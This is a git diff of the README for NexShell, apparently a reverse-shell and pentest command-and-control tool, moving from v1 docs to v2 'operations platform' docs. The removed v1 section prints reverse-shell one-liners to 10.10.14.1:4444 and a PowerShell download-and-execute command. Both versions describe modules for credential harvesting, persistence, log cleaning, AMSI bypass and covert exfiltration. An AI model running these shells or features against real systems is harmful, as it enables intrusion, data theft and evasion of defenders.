@@ -1,4 +1,4 @@
-# NexShell — Elite Reverse Shell Commander
+# NexShell v2 — Unified Pentest Operations Platform
 
 <div align="center">
 
@@ -9,286 +9,47 @@
    ██║╚██╗██║██╔══╝   ██╔██╗ ╚════██║██╔══██║██╔══╝  ██║     ██║
    ██║ ╚████║███████╗██╔╝ ██╗███████║██║  ██║███████╗███████╗███████╗
    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+              Nexus of Shell Operations  ·  v2 — Operations Platform
 ```
 
-**Nexus of Shell Operations**
-
-![Python](https://img.shields.io/badge/Python-3.6+-purple?logo=python&logoColor=white)
-![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-blueviolet)
+![Python](https://img.shields.io/badge/Python-3.8+-purple?logo=python&logoColor=white)
+![Version](https://img.shields.io/badge/Version-2.0.0-blueviolet)
+![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-blue)
 ![License](https://img.shields.io/badge/License-MIT-lime)
 ![Author](https://img.shields.io/badge/Author-vulnquest58-orange)
+![Files](https://img.shields.io/badge/Files-51%20Python%20%7C%20650KB-red)
+![Lines](https://img.shields.io/badge/Lines-15%2C560-green)
+![Commands](https://img.shields.io/badge/CLI%20Commands-57-orange)
 
 </div>
 
-> Elite reverse shell commander for penetration testers and red teamers.  
-> The operator's tool — built for those who demand more than netcat.
+> **NexShell v2** is a **Unified Pentest Operations Platform** — managing sessions, assets, findings, evidence, transport channels, operation scope, credential inventory, timelines, and real-time web dashboards from a single REPL interface. Zero external dependencies except the stdlib.
 
 ---
 
-## Demo
+## What's New in v2
 
-> Running on **Windows** (PowerShell) — zero dependencies, zero setup.
-
-![NexShell Demo](assets/nexshell_demo.png)
-
-<details>
-<summary><b>Full terminal output — <code>python nexshell.py</code> → <code>help</code></b></summary>
-
-```
-   ███╗   ██╗███████╗██╗  ██╗███████╗██╗  ██╗███████╗██╗     ██╗
-   ████╗  ██║██╔════╝╚██╗██╔╝██╔════╝██║  ██║██╔════╝██║     ██║
-   ██╔██╗ ██║█████╗   ╚███╔╝ ███████╗███████║█████╗  ██║     ██║
-   ██║╚██╗██║██╔══╝   ██╔██╗ ╚════██║██╔══██║██╔══╝  ██║     ██║
-   ██║ ╚████║███████╗██╔╝ ██╗███████║██║  ██║███████╗███████╗███████╗
-   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
-              Nexus of Shell Operations  ·  Elite Reverse Shell Commander
-
-  Version 1.0.0  *  by vulnquest58  *  Platform: Windows  Escape: F12
-
-[+]   Listening on 0.0.0.0:4444 [Listener [1]]
-
-
-(NexShell)> help
-
-  Session Operations
-    run         · [module] [args] — Run an operational module
-    upload      · <glob|URL> — Upload files to target
-    download    · <glob> — Download files from target
-    open        · <glob> — Download and open files locally
-    maintain    · [N] — Maintain N active shells per host
-    spawn       · [Port] [Host] — Spawn a new session
-    upgrade     · — Upgrade shell to PTY
-    exec        · <command> — Execute a remote command
-    script      · <local|URL> — Run script in-memory on target
-    portfwd     · <host:port -> host:port> — Port forwarding
-    tag         · [SessionID] [label] — Tag a session with a custom name
-    note        · [text] — Add a note to the current session
-  Session Management
-    sessions · [ID] — List or interact with sessions
-    use      · [SessionID|none] — Select a session
-    interact · [SessionID] — Interact with a session
-    kill     · [SessionID|*] — Kill session(s)
-    dir|.    · [SessionID] — Show session local folder
-  Shell Management
-    listeners  · [add -p <port>|stop <id>] — Manage listeners
-    payloads   · [interface] [--obfuscate] [--linux|--windows|--all] — Generate payloads
-    connect    · <Host> <Port> — Connect to a bind shell
-    Interfaces · — Show local network interfaces
-  Miscellaneous
-    help        · [command] — Show help
-    history     · — Show command history
-    cd          · [path] — Change NexShell working directory
-    reset       · — Reset local terminal
-    SET         · [option] [value] — Show/set options
-    exit|quit|q · — Exit NexShell
-
-(NexShell)>
-```
-
-</details>
-
----
-
-## Features
-
-### 🕹️ Advanced Interactive UI Engine
-- **Cross-Platform Auto-Completion**: Context-aware tab completion for commands, sub-commands, modules, session IDs, file paths, options, and settings.
-- **Typo Correction & Suggestions**: Auto-corrects minor command typos (e.g., `seessions` -> `sessions`) and suggests options for moderate typos.
-- **Short Command Aliases**: Speeds up terminal operations with shortcuts (e.g., `s` for `sessions`, `i` for `interact`, `qe` for `quickenum`).
-- **Command execution timing**: Automatically shows execution duration for commands that take longer than 1.5 seconds.
-- **Status Badges & Prompts**: Dynamic status indicators (`[L:1|S:2]`) showing active listeners, sessions, and OPSEC profile levels at a glance.
-- **Quick Action Bar**: Displays context-relevant commands if you press `Enter` on an empty command line.
-
-### 🐧 Cross-Platform Shell Quality
-| Feature | Linux | Windows | macOS |
-|---------|:-----:|:-------:|:-----:|
-| Auto PTY upgrade | ✅ | ✅ (ConPtyShell) | ✅ |
-| Shell quality score | ✅ | ✅ | ✅ |
-| OS/privilege auto-detect | ✅ | ✅ | ✅ |
-| Session logging | ✅ | ✅ | ✅ |
-| Terminal size synchronization | ✅ (SIGWINCH) | ✅ (Polling) | ✅ |
-| Re-connection & Keepalives | ✅ | ✅ | ✅ |
-
-### 🔒 Secure & Covert Transports
-- **TLS/mTLS Listeners**: Native stdlib-only TLS 1.2/1.3 encrypted listener sockets with on-the-fly certificate generation.
-- **HTTP/HTTPS Tunneling**: Clean, stateful HTTP GET/POST agent tunneling to bypass strict boundary firewalls.
-- **DNS-over-HTTPS (DoH)**: Exfiltrate data covertly by routing DNS chunks through trusted providers (Cloudflare, Google, OpenDNS).
-
-### 📂 Dynamic Payload Library
-Stored as template files under `payloads/` and dynamically rendered with target configurations:
-- **Linux (15 templates)**: bash, bash_196, mkfifo, nc_e, busybox_nc, socat, awk, python3, python2, perl, ruby, php, lua, golang, curl_sh.
-- **Windows (8 templates)**: powershell_tcp, powershell_b64, mshta_vbs, wmic_ps, conptyshell, regsvr32, certutil_dl, bitsadmin_dl.
-- **Web Shells (5 templates)**: php_system, php_exec, classic.asp, webshell.aspx, webshell.jsp.
-- **Staged (2 templates)**: stager_linux.sh, stager_windows.ps1.
-
----
-
-## Operational Modules
-
-| Category | Module | OS | Description |
-|----------|--------|:--:|-------------|
-| **Recon** | `quickenum` | Linux | Fast system enumeration (SUID, sudo, cron, network) |
-| | `win-enum` | Windows | System enumeration (AV, shares, domain) |
-| **PrivEsc** | `privesc` | Linux | PrivEsc advisor — GTFOBins, SUID, capabilities |
-| | `win-privesc` | Windows | PrivEsc: AlwaysInstallElevated, unquoted paths, services |
-| **Credentials**| `credharvest` | Linux | Credential harvester — configs, history, env files |
-| | `win-creds` | Windows | Credentials: SAM, browser, WinSCP, LAPS |
-| **AD Attack** | `ad-recon` | Windows | AD enumeration without external tools |
-| | `ad-kerberoast`| Windows | Find & roast Kerberoastable SPNs |
-| | `ad-asreproast`| Windows | Find ASREPRoastable accounts |
-| **Persistence**| `persist` | Both | Persistence (crontab, systemd, registry, WMI, startup) |
-| **Lateral** | `lateral` | Both | Lateral movement (SSH, DCOM, WMI, Pass-the-Hash) |
-| **Container** | `container` | Linux | Container/Docker/K8s escape checks |
-| | `container-auto`| Linux | Auto-escape (tries all escape paths sequentially) |
-| **Loot** | `loot` | Both | Loot auto-collector (extracts keys, tokens, creds) |
-| | `loot-scan` | Both | Scan session output logs for sensitive patterns |
-| | `loot-report` | Both | Export collected loot (JSON, Markdown, HTML) |
-| **OPSEC** | `opsec` | Both | Stealth profiles (ghost, normal, paranoid) |
-| | `timestomp` | Both | Match target file timestamps with system binaries |
-| | `logclean` | Both | Clean logs and history files on the target |
-| | `obfuscate` | Both | Obfuscate command lines (XOR, Base64, Hex, IEX) |
-| **Exfil** | `exfil` | Both | Data exfiltration (HTTP, DNS, SMB, ICMP) |
-
----
-
-## Installation
-
-### Linux / macOS / BSD
-
-```bash
-git clone https://github.com/vulnquest58/nexshell
-cd nexshell
-chmod +x setup.sh
-./setup.sh install
-```
-
-### Windows (PowerShell)
-
-```powershell
-git clone https://github.com/vulnquest58/nexshell
-cd nexshell
-python nexshell.py
-```
-
----
-
-## Quick Start
-
-```bash
-# Start listener on default port 4444
-nexshell
-
-# Listen on multiple ports
-nexshell -p 4444,5555,9001
-
-# Show ALL payloads (Linux + Windows) for your IP
-nexshell -a
-
-# Show Linux payloads only
-nexshell -a --linux
-
-# Show Windows payloads with obfuscation
-nexshell -a --windows --obfuscate
-
-# Show AMSI bypass snippets
-nexshell --amsi
-
-# Connect to a bind shell
-nexshell -c 10.10.10.10 -p 4444
-
-# Auto-run QuickEnum on every new shell
-nexshell --auto-enum
-
-# Run in Stealth mode with command jitter (OPSEC)
-nexshell --stealth --jitter 500
-```
-
----
-
-## Main Menu Commands
-
-Once a session is received, press `F12` to detach and access the main menu:
-
-```
-Session Operations:
-  run            Run a module (quickenum, privesc, win-enum, ad-recon, loot...)
-  upload         Upload files to target
-  download       Download files from target
-  exec           Execute a remote command
-  upgrade        Upgrade shell to PTY
-  spawn          Spawn additional sessions
-  maintain       Auto-maintain N shells per host
-  tag            Tag a session with a custom label
-  note           Add notes to a session
-
-Session Management:
-  sessions       List all active sessions
-  use <ID>       Select a session
-  interact <ID>  Attach to a session
-  kill <ID|*>    Kill session(s)
-
-Shell Management:
-  listeners      Manage listeners (add/stop)
-  payloads       Generate reverse shell payloads
-  connect        Connect to a bind shell
-  Interfaces     Show network interfaces
-```
-
----
-
-## Module Usage Examples
-
-```
-# Linux target
-(NexShell)─(Session [1] · user)> run quickenum
-(NexShell)─(Session [1] · user)> run privesc
-(NexShell)─(Session [1] · user)> run credharvest
-
-# Windows target
-(NexShell)─(Session [2] · SYSTEM)> run win-enum
-(NexShell)─(Session [2] · SYSTEM)> run win-privesc
-(NexShell)─(Session [2] · SYSTEM)> run win-creds
-
-# Active Directory
-(NexShell)─(Session [2] · user)> run ad-recon
-(NexShell)─(Session [2] · user)> run ad-kerberoast
-(NexShell)─(Session [2] · user)> run ad-asreproast
-
-# Persistence (auto-detects OS)
-(NexShell)─(Session [1] · root)> run persist
-
-# Lateral movement options
-(NexShell)─(Session [1] · root)> run lateral
-
-# Container escape check
-(NexShell)─(Session [1] · user)> run container
-
-# Exfiltration techniques
-(NexShell)─(Session [1] · root)> run exfil
-```
-
----
-
-## Payload Examples
-
-### Linux
-```bash
-bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));...'
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f
-```
-
-### Windows (PowerShell)
-```powershell
-powershell -nop -NonI -ep bypass -enc <base64_encoded_reverse_shell>
-mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ..."",0:close")
-```
-
-### Windows (ConPtyShell — Full PTY)
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://.../Invoke-ConPtyShell.ps1');
-Invoke-ConPtyShell -RemoteIp 10.10.14.1 -RemotePort 4444 -Rows 50 -Cols 220
-```
+| Feature | v1 | v2 |
+|---------|:--:|:--:|
+| SQLite persistence | ❌ | ✅ |
+| Real-time Web Dashboard | ❌ | ✅ |
+| WebSocket + HTTP transport | ❌ | ✅ |
+| Operation scope + timeline + checklist | ❌ | ✅ |
+| Service inventory + credential store | ❌ | ✅ |
+| Persistent notes | ❌ | ✅ |
+| Engagement templates (4 types) | ❌ | ✅ |
+| Asset inventory (Hosts) | ❌ | ✅ |
+| Security findings | ❌ | ✅ |
+| Evidence + chain of custody | ❌ | ✅ |
+| MITRE ATT&CK mapping (30+ TTPs) | ❌ | ✅ |
+| Attack playbooks | ❌ | ✅ |
+| Automated workflows (DAG) | ❌ | ✅ |
+| Plugin system | ❌ | ✅ |
+| Rule engine (8 built-in rules) | ❌ | ✅ |
+| Report generation (MD/HTML/JSON) | ❌ | ✅ |
+| Health monitor + analytics | ❌ | ✅ |
+| OPSEC profiles (ghost/paranoid) | basic | ✅ full |
+| Event bus (async pub/sub) | ❌ | ✅ |
 
 ---
 
@@ -296,43 +57,357 @@ Invoke-ConPtyShell -RemoteIp 10.10.14.1 -RemotePort 4444 -Rows 50 -Cols 220
 
 ```
 nexshell/
-├── nexshell.py             # Main commander engine (standalone, no deps)
-├── modules/
-│   ├── __init__.py
-│   ├── loot.py             # Loot parser, log scanner, HTML/Markdown/JSON exporter
-│   ├── ops.py              # Recon, persistence, lateral, container escape, exfiltration
-│   ├── opsec.py            # OPSEC profiles (ghost/normal/paranoid), timestomp, logclean, obfuscation
-│   ├── session_manager.py  # Snapshots, health monitoring, SIGWINCH/polling term sync, PTY upgrade advisor
-│   ├── transport.py        # TLS/mTLS listeners, HTTP/HTTPS tunnels, DoH exfil covert channel
-│   ├── ui.py               # Auto-completer, typo corrector, aliases, inline hints, timer
-│   └── windows.py          # Windows payloads, AMSI bypasses, PrivEsc checks, credential harvest
-├── payloads/
-│   ├── __init__.py
-│   ├── linux/              # Linux reverse shell templates (bash, awk, busybox, etc.)
-│   ├── staged/             # Staged loaders (stager_linux, stager_windows)
-│   ├── web/                # Web shells (php, asp, aspx, jsp)
-│   └── windows/            # Windows reverse shell templates (powershell, conptyshell, lolbins)
-├── setup.sh                # Cross-platform installer (Linux/macOS)
-└── README.md               # Documentation
+├── nexshell.py           # Main REPL — 57 CLI commands, 3,600+ lines
+│
+├── core/                 # Framework kernel
+│   ├── event_bus.py      # Async pub/sub event dispatcher
+│   ├── plugin.py         # NexPlugin base + auto-discovery registry
+│   ├── rules.py          # Rule engine — 8 auto-detection rules
+│   ├── scheduler.py      # Priority task queue + background workers
+│   └── workflow.py       # DAG workflow engine — 4 built-in workflows
+│
+├── db/                   # SQLite persistence layer
+│   ├── database.py       # NexDB — full CRUD for all entities
+│   └── schema_v2.py      # Schema: hosts, findings, operations, evidence
+│
+├── modules/              # Transport + utilities
+│   ├── transport.py      # TLS listener + HTTP tunnel v1
+│   ├── transport/        # v2 enhanced transport package
+│   │   ├── http_tunnel.py  # HTTP covert channel (XOR, multi-agent, jitter)
+│   │   └── websocket.py    # RFC 6455 WebSocket (multi-client, ping/pong)
+│   ├── loot.py           # Loot collection → SQLite
+│   ├── session_manager.py
+│   └── ...
+│
+├── web/                  # Real-time Web Dashboard (stdlib only)
+│   ├── server.py         # HTTP + WebSocket combined server
+│   └── templates/
+│       ├── index.html    # Dark-mode dashboard — 7 views
+│       ├── style.css     # Premium CSS — CSS vars, animations
+│       └── app.js        # Real-time WS client + REST fallback
+│
+├── operations/           # Engagement management
+│   ├── operation.py      # Operation workspace (scope, objectives)
+│   ├── scope.py          # CIDR scope manager + in/out-of-scope check
+│   ├── timeline.py       # Engagement timeline — 10 event types
+│   └── checklist.py      # Pentest (25 items) + CTF (10 items) checklists
+│
+├── inventory/            # Asset intelligence
+│   ├── hosts.py          # HostInventory + FindingsManager + attack graph
+│   ├── services.py       # ServiceInventory — 60+ port maps, nmap parser
+│   ├── credentials.py    # CredentialStore — dedup, type detect, crack track
+│   └── tags.py           # Tagging system
+│
+├── knowledge/            # OSINT + reference knowledge
+│   ├── mitre.py          # MITRE ATT&CK (30+ TTPs) + PlaybookEngine
+│   └── notes.py          # Persistent notes — search, pin, tag, export
+│
+├── evidence/             # Chain of custody
+│   └── collector.py      # SHA256 hash, timestamp, ZIP export
+│
+├── reports/              # Report generation
+│   └── reporter.py       # Markdown + HTML + JSON output
+│
+├── config/               # Configuration management
+│   ├── profiles.py       # 3 OPSEC profiles + 4 operator roles
+│   └── templates.py      # 4 engagement templates
+│
+├── services/             # Platform services
+│   └── health.py         # Health monitor + analytics engine
+│
+├── models/               # Shared data models
+│   └── __init__.py       # Host, Service, Finding, Evidence, Operation
+│
+└── plugins/              # Auto-discovered plugins
+    └── example_quickenum.py
 ```
 
 ---
 
-## Inspired by
+## Quick Start
 
-- [penelope](https://github.com/brightio/penelope) by @brightio — the foundation
-- [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) — Windows PTY
-- [nishang](https://github.com/samratashok/nishang) — PowerShell attack toolkit
-- [BloodHound](https://github.com/BloodHoundAD/BloodHound) — AD attack paths
+```bash
+git clone https://github.com/vulnquest58/nexshell
+cd nexshell
+python nexshell.py
+```
+
+```
+(NexShell)> help          # Show all 57 commands
+(NexShell)> web start     # Launch real-time dashboard → http://localhost:8888
+(NexShell)> health        # System health check
+```
 
 ---
 
-## Author
+## CLI Commands (57 total)
 
-**vulnquest58**  
-HackMyVM Rank #77 · HTB · CTF Player  
-[vulnquest58.github.io](https://vulnquest58.github.io)
+### Transport & Shells
+| Command | Description |
+|---------|-------------|
+| `listeners` | Manage reverse shell listeners |
+| `connect` | Connect to a listener |
+| `payloads` | Generate reverse shell payloads |
+| `transport list` | List all transport types (tcp/tls/http/ws/doh) |
+| `transport http [port]` | Start HTTP covert channel server |
+| `transport ws [port]` | Start WebSocket C2 server |
+| `transport agent <type> <host> <port>` | Generate agent payload |
+
+### Web Dashboard
+| Command | Description |
+|---------|-------------|
+| `web start [port]` | Launch real-time dashboard (default :8888) |
+| `web stop` | Stop dashboard server |
+| `web open` | Open dashboard in browser |
+| `web status` | Show dashboard status + connected clients |
+
+### Session Operations
+| Command | Description |
+|---------|-------------|
+| `sessions` | List all sessions |
+| `use <id>` | Interact with session |
+| `run <cmd>` | Run command in active session |
+| `upload / download` | File transfer |
+| `quickenum` | Auto enumeration |
+| `privesc` | Privilege escalation suggestions |
+| `credharvest` | Auto credential harvest |
+
+### Operation Management
+| Command | Description |
+|---------|-------------|
+| `operation new <name>` | Create new engagement |
+| `operation active` | Show active operation |
+| `scope add <ip/cidr>` | Add IP/CIDR to scope |
+| `scope check <ip>` | Check if IP is in scope |
+| `scope exclude <ip>` | Add exclusion |
+| `timeline add <event>` | Record engagement event |
+| `timeline show` | Display ASCII timeline |
+| `checklist show` | Show engagement checklist |
+| `checklist complete <key>` | Mark item complete |
+| `template list` | List engagement templates |
+| `template apply <name>` | Apply template to operation |
+
+### Asset Intelligence
+| Command | Description |
+|---------|-------------|
+| `host add <ip>` | Add host to inventory |
+| `host list` | List all hosts |
+| `svc add <ip> <port>` | Add service |
+| `svc interesting` | Show high-value services |
+| `creds add` | Add credential manually |
+| `creds hashes` | Show all hashes |
+| `creds crack <user> <pw>` | Mark credential cracked |
+| `graph` | ASCII attack graph |
+| `finding add` | Add security finding |
+
+### Knowledge & Notes
+| Command | Description |
+|---------|-------------|
+| `note add [text]` | Add persistent note |
+| `note search <kw>` | Search notes |
+| `note pin <id>` | Pin important note |
+| `mitre list` | List MITRE techniques |
+| `mitre search <term>` | Search techniques |
+| `playbook run <name>` | Run attack playbook |
+
+### Evidence & Reporting
+| Command | Description |
+|---------|-------------|
+| `evidence capture <file>` | Capture evidence with hash |
+| `evidence export` | Export ZIP archive |
+| `report generate` | Generate pentest report |
+| `report generate --format html` | HTML report |
+
+### Platform
+| Command | Description |
+|---------|-------------|
+| `health` | Full health check |
+| `stats` | Analytics dashboard |
+| `config show` | Show active OPSEC profile |
+| `config set ghost` | Switch to ghost mode |
+| `plugins` | List loaded plugins |
+| `workflow list` | List available workflows |
+| `workflow run <name>` | Execute workflow |
+| `db stats` | Database statistics |
 
 ---
 
-> *"The best tool is the one you own."*
+## Web Dashboard
+
+The real-time web dashboard is served at `http://localhost:8888` (configurable).
+
+```
+(NexShell)> web start 8888
+[+] Dashboard started → http://localhost:8888
+[+] Browser opened automatically.
+```
+
+**Dashboard views:**
+
+| View | Description |
+|------|-------------|
+| Dashboard | Live stat cards + activity feed + recent findings |
+| Sessions | All active and historical sessions |
+| Hosts | Asset inventory with risk scores |
+| Findings | Security findings with severity filter |
+| Loot | Collected loot with category/source |
+| MITRE ATT&CK | Observed techniques heatmap |
+| Operation | Current engagement details |
+
+**Features:**
+- Real-time WebSocket push (every 3 seconds)
+- REST API fallback (`/api/snapshot`, `/api/sessions`, etc.)
+- EventBus wiring — findings/sessions/loot appear instantly
+- Keyboard shortcuts: `Alt+1` through `Alt+7`
+- Zero dependencies — pure stdlib HTTP + WebSocket server
+
+---
+
+## Transport Channels
+
+| Channel | Stealth | Speed | Use Case |
+|---------|---------|-------|----------|
+| `tcp` | ⭐ | ⚡⚡⚡ | Internal networks |
+| `tls` | ⭐⭐⭐ | ⚡⚡⚡ | TLS 1.3 encrypted |
+| `http` | ⭐⭐⭐⭐ | ⚡⚡ | HTTP POST tunneling |
+| `https` | ⭐⭐⭐⭐⭐ | ⚡⚡ | HTTPS (self-signed) |
+| `websocket` | ⭐⭐⭐⭐ | ⚡⚡⚡ | Browser-like traffic |
+| `wss` | ⭐⭐⭐⭐⭐ | ⚡⚡⚡ | WS over TLS |
+| `doh` | ⭐⭐⭐⭐⭐ | ⚡ | DNS-over-HTTPS exfil |
+
+**Generate agents:**
+```bash
+# HTTP agent (Linux bash)
+(NexShell)> transport agent http 10.10.14.1 8080 /api/ping 5
+
+# HTTPS agent
+(NexShell)> transport agent https 10.10.14.1 8443 /api/ping
+
+# PowerShell agent
+(NexShell)> transport agent powershell 10.10.14.1 8080 /api/ping
+
+# Python stdlib agent
+(NexShell)> transport agent python 10.10.14.1 8080 /api/ping
+
+# WebSocket agent (Linux)
+(NexShell)> transport agent ws 10.10.14.1 9001 /
+
+# WebSocket agent (Python, cross-platform)
+(NexShell)> transport agent ws-python 10.10.14.1 9001 /
+```
+
+---
+
+## Engagement Templates
+
+| Template | Type | OPSEC | Use Case |
+|----------|------|-------|----------|
+| `internal_pentest` | pentest | normal | Internal network assessment |
+| `external_pentest` | pentest | normal | External perimeter test |
+| `red_team` | red_team | paranoid | Full red team engagement |
+| `ctf` | ctf | normal | CTF competitions |
+
+```bash
+(NexShell)> template list
+(NexShell)> template apply red_team
+(NexShell)> template show ctf
+```
+
+---
+
+## OPSEC Profiles
+
+| Profile | Logging | Delay | Use Case |
+|---------|---------|-------|----------|
+| `normal` | full | none | Internal assessments |
+| `ghost` | minimal | 0–1s | Evasion-aware tests |
+| `paranoid` | none | 1–3s | APT simulation |
+
+```bash
+(NexShell)> config set ghost
+(NexShell)> config show
+```
+
+---
+
+## Plugin Development
+
+```python
+from core.plugin import NexPlugin
+
+class MyPlugin(NexPlugin):
+    name        = "my_plugin"
+    description = "Does something useful"
+    author      = "you"
+    version     = "1.0"
+
+    def on_session_connect(self, session):
+        """Auto-runs when a new session connects."""
+        output = self.exec("id; whoami; hostname")
+        self.loot(output, category="auto_enum")
+        self.finding("Low", "Plugin ran", self.session.host)
+        self.emit("plugin.ran", plugin=self.name)
+```
+
+Drop the file in `plugins/` — it's auto-discovered on startup.
+
+---
+
+## Event Bus
+
+Internal pub/sub system wires all modules together:
+
+```python
+from core.event_bus import bus
+
+# Subscribe
+bus.subscribe('session.connected', lambda **kw: print("New session!", kw))
+
+# Emit
+bus.emit('finding.created', severity='high', host='10.0.0.1', title='SQLi')
+```
+
+**Built-in events:**
+
+| Event | Triggered by |
+|-------|-------------|
+| `session.connected` | New reverse shell |
+| `session.disconnected` | Shell died |
+| `loot.added` | New loot collected |
+| `finding.created` | Security finding added |
+| `host.added` | New host discovered |
+| `cred.discovered` | Credential found |
+| `timeline.event` | Engagement event added |
+| `rule.triggered` | Rule engine match |
+
+---
+
+## Database
+
+SQLite database at `nexshell.db` — zero configuration needed.
+
+```bash
+(NexShell)> db stats           # Show record counts
+(NexShell)> db search loot admin   # Search loot
+(NexShell)> db export          # Export full JSON dump
+(NexShell)> db vacuum          # VACUUM (compact DB)
+```
+
+**Schema tables:** `sessions`, `loot`, `hosts`, `findings`, `operations`, `evidence`, `operation_scope`, `operation_objectives`
+
+---
+
+## Stats
+
+```
+51 Python files  ·  3 web files  ·  15,560 lines  ·  650 KB
+20 phases         ·  57 CLI commands  ·  8/8 tests passing
+```
+
+---
+
+## License
+
+MIT License — for authorized security testing only.
+
+> ⚠️ Use only on systems you own or have explicit written permission to test.
